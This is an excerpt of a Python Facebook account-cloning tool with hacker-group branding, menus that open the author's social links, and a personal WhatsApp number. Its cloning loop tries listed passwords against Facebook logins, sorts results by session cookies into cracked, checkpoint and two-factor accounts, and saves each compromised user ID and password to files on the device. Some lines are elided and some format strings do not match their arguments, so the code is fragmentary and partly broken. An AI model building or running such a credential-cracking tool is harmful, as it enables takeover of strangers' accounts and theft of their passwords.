...
logo =f"""\033[93;1m 
\033[1;31
\033[1;31m    _____   ______   __     __  __    __  __    __ 
\033[1;31m   /     | /      \ /  |   /  |/  |  /  |/  \  /  |
\033[1;31m   $$$$$ |/$$$$$$  |$$ |   $$ |$$ |  $$ |$$  \ $$ |
\033[1;31m      $$ |$$$  \$$ |$$ |   $$ |$$ |__$$ |$$$  \$$ |
\033[1;31m __   $$ |$$$$  $$ |$$  \ /$$/ $$    $$ |$$$$  $$ |
...
\033[1;37m╔════════════════════════════════════════════╗
\033[1;31m│\033[1;32m☞  \033[1;32m 𝐀𝐔𝐓𝐇𝐎𝐑     \033[1;31m➟   \033[1;32m TOXIC-JOVAN                 \033[1;31m│
\033[1;31m│\033[1;32m☞  \033[1;32m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊   \033[1;31m➟   \033[1;32mBANGLADESH BLACK HEART HACKER            \033[1;31m│
\033[1;31m│\033[1;32m☞  \033[1;32m𝐆𝐈𝐓𝐇𝐔𝐁    \033[1;31m ➟   \033[1;32m Toxic-jovan        \033[1;31m│
\033[1;31m│\033[1;32m☞  \033[1;32m𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏  \033[1;31m ➟   \033[1;32m+8801753706851            \033[1;31m│
\033[1;31m│\033[1;32m☞  \033[1;32m𝐕𝐄𝐑𝐒𝐈𝐎𝐍   \033[1;31m ➟   \033[1;32m0.4                       \033[1;31m│
\033[1;31m│\033[1;32m☞  \033[1;32m𝐘𝐎𝐔𝐓𝐔𝐁𝐄   \033[1;31m ➟   \033[1;32m Update Tricks        \033[1;31m│
\033[1;37m╚🅑︎🅗︎🅣︎FACEBOOK TRICKS AND HELPING ZONE [J0V4N]\033[1;37m🅑︎🅗︎🅣︎╝
\033[1;91m==========================================================
\033[31;44m EVERYONE THINKS OF BANGLADESH BLACK HEART HACKER THE WORLD     
 BUT NO ONE THINKS OF Bangladesh Black Heart Hacker.. 🍂\033[0;m
\033[1;91m=========================================================="""
...
def checks(ok,cp):
    if not len(ok) != 0:
        pass
    if len(cp) != 0:
        print('\n\n\x1b[1;97m TOTAL OK : \x1b[1;97m %s  \x1b[1;97mJ0V4N-OK.txt' % (
            H, P, str(len(ok))))
        print('\x1b[1;97m TOTAL CP :\x1b[1;97m   %s \x1b[1;97mBBHH-CP.txt' %
              (H, P, str(len(cp))))
...
def my_tool_security():
    ...
    print(47*"-")
    print(c, 45*"-", wit)
    print("\t  Facebook : MD NURUL HAQ RONE")
    print("\t  Fb page  : TOXIC")
    print("\t  Github   : TOXIC-JOVAN")
    print(c, 45*"-")
    print(47*"-")
    try:
        ...
        print("\t Welcome To TOXIC-JOVAN-BBHH-TEAM Tool ....")
        time.sleep(2)
...
#---------------------[MAIN MENU]---------------------#
def xyz():
    os.system("play-audio WELCOME_TO_TOXIC-JOVAN-BBHH-TEAM_RANDOM_CLONE_TOOL.mp3")
    os.getuid
    ...
    if hamii in ["1","01"]:
        ...
        os.system("xdg-open https://www.facebook.com/i.love.allah.its.jovan.vau");xyz()
    elif hamii in ["4","04"]:
        os.system("xdg-open https://wa.me/+8801753706851")
        xyz()    
    elif hamii in ["0","00"]:
       exit()
    else:
...
def password():
    ...
    if passX in ['1','01']:
        ...
        os.system("xdg-open https://m.youtube.com/channel/UCF7OkB3R5o-mmyXzOZdVsdA")
        password5()
    else:
        xyz()
#---------------------[CLONING MAIN DEF]---------------------#
        ...
        for ps in pwx:
           ...
           "scheme": 'https',
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[7:22]
                os.system("play-audio J0V4N_OK.mp3")
                print('\r\033[1;32m[J0V4N-OK] '+uid+' [√] '+ps+ '')
                cek_apk(session,coki)
                open('/sdcard/J0V4N-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
            elif 'checkpoint' in log_cookies:
                if 'Enter login code to continue' in log_cookies:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                    os.system("play-audio J0V4N_2F.mp3")
                    print('\r\033[1;34m[J0V4N-2F] '+uid+' [~] '+ps+' ')
                    open('/sdcard/J0V4N-2F.txt', 'a').write(uid+' | '+ps+'\n')
                    twf.append(uid)
                else:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                    Red = '\033[1;31m'
                    os.system("play-audio TOXIC_CP.mp3")
                    print(f'\r\033[1;30m[TOXIC-CP] '+uid+' [×] '+ps+ ' ')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[TOXIC-JOVAN🔥] [%s] \33[1;97m[OK:%s{hamii2}CP:%s]'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
        checks(ok,cp)
    except:
        pass
           ...
           "scheme": 'https',
            ...
            if 'c_user' in log_cookies:
                ...
                if 'Enter login code to continue' in log_cookies:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                    os.system("play-audio BBHH_2F.mp3")
                    print('\r\033[1;34m[BBHH-2F] '+uid+' [~] '+ps+' ')
                    open('/sdcard/BBHH.F.txt', 'a').write(uid+' | '+ps+'\n')
                    twf.append(uid)
                else:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
